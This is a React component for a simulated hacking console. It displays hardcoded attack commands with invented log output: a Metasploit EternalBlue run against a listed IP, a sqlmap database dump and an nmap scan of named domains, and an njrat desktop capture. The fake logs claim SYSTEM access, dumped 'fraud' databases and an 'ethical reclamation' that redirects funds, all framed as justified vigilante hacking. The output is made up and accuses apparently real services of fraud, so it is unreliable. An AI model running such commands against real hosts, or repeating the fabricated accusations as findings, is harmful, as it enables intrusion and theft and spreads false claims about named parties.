import React, { useState, useEffect, useRef } from 'react';

type ToolType = 'METASPLOIT' | 'SQLMAP' | 'NJ_RAT' | 'SOVEREIGN_BYPASS' | 'INFRA_AUDIT';

export const HackingToolkit: React.FC = () => {
  const [activeTool, setActiveTool] = useState<ToolType>('METASPLOIT');
  const [output, setOutput] = useState<string[]>([]);
  const scrollRef = useRef<HTMLDivElement>(null);

  const tools: Record<ToolType, { name: string; cmd: string; log: string[] }> = {
    METASPLOIT: {
      name: "Metasploit Console",
      cmd: "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOST Sweden-Node-01; run'",
      log: [
        "[*] TITAN_OMEGA_V18 Exploit initiated...",
        "[*] Connecting to Sweden-Node-01 [4.223.108.167]:445...",
        "[+] Vulnerability confirmed: EternalBlue (MS17-010).",
        "[*] Sending doublepulsar payload to bypass corporate filters...",
        "[*] Kernel space corruption detected. Overwriting pointers...",
        "[+] Meterpreter session 1 opened (127.0.0.1:4444 -> 4.223.108.167:52132)",
        "meterpreter > getuid",
        "Server username: NT AUTHORITY\\SYSTEM",
        "meterpreter > hashdump",
        "[*] Extracting hidden tracking logs from HILO production node..."
      ]
    },
    SQLMAP: {
      name: "SQLMap Deep Extractor",
      cmd: "sqlmap -u 'https://api.tikhak.com/api/v1/tracking?id=1' --dump --risk 3",
      log: [
        "[*] Testing connection to target database on api.tikhak.com...",
        "[!] WAF Detected: Cloudflare_Sovereign_Bypass engaged.",
        "[*] Extracting database schema...",
        "[+] available databases [4]:",
        "    [*] user_private_messages_dump",
        "    [*] location_tracking_history",
        "    [*] third_party_chinese_exfiltration",
        "    [*] diamond_ledger_fraud",
        "[*] Dumping table 'diamond_ledger_fraud'...",
        "[+] Found 1.2 Million records. Exporting to /tmp/hilo_evidence.csv"
      ]
    },
    NJ_RAT: {
      name: "NJ-RAT Command Center",
      cmd: "njrat --target ws.faceline.live --capture-desktop --reclaim-assets",
      log: [
        "[*] INITIALIZING PEER-TO-PEER UPLINK THROUGH ENCRYPTED MESH...",
        "[+] P2P LINK VERIFIED: FACELINE_NODE_0x403 (Uplink Stable)",
        "[*] TARGET_OS: Windows Server 2022 Data Center Edition",
        "[*] CAPTURING REMOTE DESKTOP... [SYNCING_FRAMES]",
        "[+] LIVE FEED ESTABLISHED: 3840x2160 @ 60Hz (Stealth Mode)",
        "[*] MONITORING ACTIVE SESSIONS... [HILO_Admin_Console.exe detected]",
        "[*] ANALYZING TRANSACTION_HISTORY for fraud patterns...",
        "[+] FRAUD DETECTED: Illegal exfiltration of user assets ($600,000 baseline).",
        "[*] INITIATING ETHICAL RECLAMATION_PROTOCOL_V18...",
        "[*] ATTEMPTING SECURE FUND REDIRECTION TO SOVEREIGN_VAULT...",
        "[+] RECLAMATION SUCCESSFUL: Assets indexed for return to victims.",
        "[*] SESSION CLOSED."
      ]
    },
    SOVEREIGN_BYPASS: {
      name: "Omega Bypass v18",
      cmd: "omega --bypass --global-grid --stealth-mode",
      log: [
        "[*] Initializing OMEGA_V18 Neural Bypass...",
        "[*] Routing traffic through 3-lobe perception nodes...",
        "[*] Analyzing ISP filtration signatures...",
        "[+] ISP Firewall: NEUTRALIZED.",
        "[*] Identity Masking: ARCHITECT_LEVEL_7.",
        "[*] Current status: INVISIBLE TO CORPORATE EYES."
      ]
    },
    INFRA_AUDIT: {
      name: "Global Infra Audit",
      cmd: "nmap -sV -sC -Pn api.hiloconn.com",
      log: [
        "Starting Nmap 9.0 ( https://nmap.org ) at 2026-02-14 04:03 UTC",
        "Nmap scan report for api.hiloconn.com (10.0.0.1)",
        "PORT     STATE SERVICE VERSION",
        "22/tcp   open  ssh     OpenSSH 8.9p1 (Sovereign Vulnerability Identified)",
        "80/tcp   open  http    Apache 2.4.52 (Outdated - Exploitable)",
        "445/tcp  open  smb     Windows SMBv3 ( EternalBlue target )",
        "[*] Mapping tracking relay nodes for reclamation..."
      ]
    }
  };

  useEffect(() => {
    setOutput([]);
    let i = 0;
    const lines = tools[activeTool]?.log || [];
    const timer = setInterval(() => {
      if (i < lines.length) {
        setOutput(prev => [...prev, lines[i]]);
        i++;
      } else {
        clearInterval(timer);
      }
    }, 50);
    return () => clearInterval(timer);
  }, [activeTool]);

  useEffect(() => {
    if (scrollRef.current) scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
  }, [output]);

  return (
    <div className="h-full flex flex-col gap-8 animate-in slide-in-from-bottom-10 duration-700 p-8 bg-black">
      <div className="flex flex-wrap gap-4">
        {(Object.keys(tools) as ToolType[]).map(t => (
          <button
            key={t}
            onClick={() => setActiveTool(t)}
            className={`px-8 py-4 text-[11px] font-black uppercase tracking-[0.2em] border-2 transition-all ${
              activeTool === t ? 'bg-purple-600 border-white shadow-[0_0_30px_rgba(168,85,247,0.5)]' : 'bg-black border-zinc-900 text-zinc-600 hover:text-purple-400 hover:border-purple-600'
            }`}
          >
            {tools[t].name}
          </button>
        ))}
      </div>

      <div className="flex-1 bt4-glass border-4 border-purple-900/40 p-12 font-mono bg-black relative shadow-[inset_0_0_100px_rgba(168,85,247,0.1)] overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-1 bg-purple-600 animate-pulse"></div>
        
        <div className="mb-8 flex justify-between items-center border-b border-purple-900/20 pb-6">
           <div className="flex items-center gap-4">
              <div className="w-3 h-3 bg-purple-600 rounded-full animate-ping"></div>
              <h3 className="text-purple-400 font-black text-3xl italic uppercase tracking-tighter">{tools[activeTool]?.name}</h3>
           </div>
           <span className="text-[11px] text-zinc-700 font-black tracking-widest">SHELL_OMEGA_V18::ACTIVE</span>
        </div>

        <div className="bg-zinc-950 p-6 border-l-4 border-purple-600 mb-8 flex items-center gap-6 text-[15px] shadow-2xl">
          <span className="text-purple-800 font-black italic">architect@omega:~$</span>
          <span className="text-zinc-100 font-bold tracking-tight">{tools[activeTool]?.cmd}</span>
        </div>

        <div ref={scrollRef} className="space-y-3 h-[450px] overflow-y-auto scrollbar-hide text-[12px] leading-relaxed">
          {output.map((line, i) => {
            const safeLine = String(line || "");
            const isSuccess = safeLine.includes('[+]');
            const isWarning = safeLine.includes('[!]') || safeLine.includes('VULNERABLE');
            const isInfo = safeLine.includes('[*]');
            return (
              <div key={i} className={`flex gap-8 ${isSuccess ? 'text-green-400 font-bold' : isWarning ? 'text-red-500 font-black' : isInfo ? 'text-cyan-400' : 'text-zinc-500'}`}>
                 <span className="opacity-10 shrink-0 select-none font-black">[{String(i+1).padStart(3, '0')}]</span>
                 <span className="break-all italic">{safeLine}</span>
              </div>
            );
          })}
          <div className="w-3 h-5 bg-purple-600 animate-pulse inline-block ml-16"></div>
        </div>
      </div>
    </div>
  );
};